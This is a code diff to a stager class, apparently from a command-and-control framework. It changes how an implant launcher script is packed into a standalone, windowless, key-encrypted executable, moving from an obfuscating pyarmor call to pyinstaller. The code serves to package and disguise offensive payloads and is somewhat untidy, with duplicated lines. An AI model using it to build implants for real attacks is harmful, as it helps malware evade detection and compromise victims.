@@ -3,7 +3,7 @@ from __future__ import print_function
 import logging
 import os
 import time
-from builtins import object, str
+from builtins import object
 
 log = logging.getLogger(__name__)
 
@@ -112,18 +112,61 @@ class Stager(object):
         with open(f'{binary_file_str}.py', 'w') as text_file:
             text_file.write(f"{launcher}")
 
-        ext = '.exe' if 'win' in listener_build.lower().strip() else ''
-
+        log.info(f"Created {binary_file_str}.py")
+        # ico = 'app.ico'
+        # xec = f'pyarmor-7 pack --clean --name={secrets.token_hex(8)} ' \
+        #       f'-e " --onefile --noupx --noconsole --key {secrets.token_hex(8)} " ' \
+        #       f'-x " --mix-str --advanced 1 " ' \
+        #       f'{binary_file_str}.py'
+        # subprocess.run(xec)
+        # subprocess.run(
+        #     [
+        #         'pyarmor-7',
+        #         'pack',
+        #         '--clean',
+        #         '--name=',
+        #         f'--name={secrets.token_hex(8)}',
+        #         '-e',
+        #         f'"--onefile --noupx --noconsole --key {secrets.token_hex(8)} "',
+        #         '-x',
+        #         '"--mix-str --advanced 1 "',
+        #         f'{binary_file_str}.py',
+        #     ]
+        # )
+        log.info(f"Created {binary_file_str}.py")
         import secrets
-        pyarm = f'pyarmor-7{ext}'
-        main = f'{binary_file_str}.py'
-        #ico = 'app.ico'
-        xec = f'{pyarm} pack --clean --name={secrets.token_hex(8)} ' \
-              f'-e " --onefile --noupx --noconsole --key {secrets.token_hex(8)} " ' \
-              f'-x " --mix-str --advanced 1 " ' \
-              f'{main}'
-
-        subprocess.run(xec)
+        log.info([
+            'pyinstaller',
+            f'{binary_file_str}.py',
+            '--onefile',
+            '--clean',
+            '--noupx',
+            '--noconsole',
+            f'--key {secrets.token_hex(8)}',
+            '--specpath',
+            os.path.dirname(binary_file_str),
+            '--distpath',
+            os.path.dirname(binary_file_str),
+            '--workpath',
+            f"/tmp/{str(time.time())}-build/"
+        ])
+        subprocess.run(
+            [
+                'pyinstaller',
+                f'{binary_file_str}.py',
+                '--onefile',
+                '--clean',
+                '--noupx',
+                '--noconsole',
+                f'--key {secrets.token_hex(8)}',
+                '--specpath',
+                os.path.dirname(binary_file_str),
+                '--distpath',
+                os.path.dirname(binary_file_str),
+                '--workpath',
+                f"/tmp/{str(time.time())}-build/"
+            ]
+        )
 
         with open(binary_file_str, "rb") as f:
             exe = f.read()
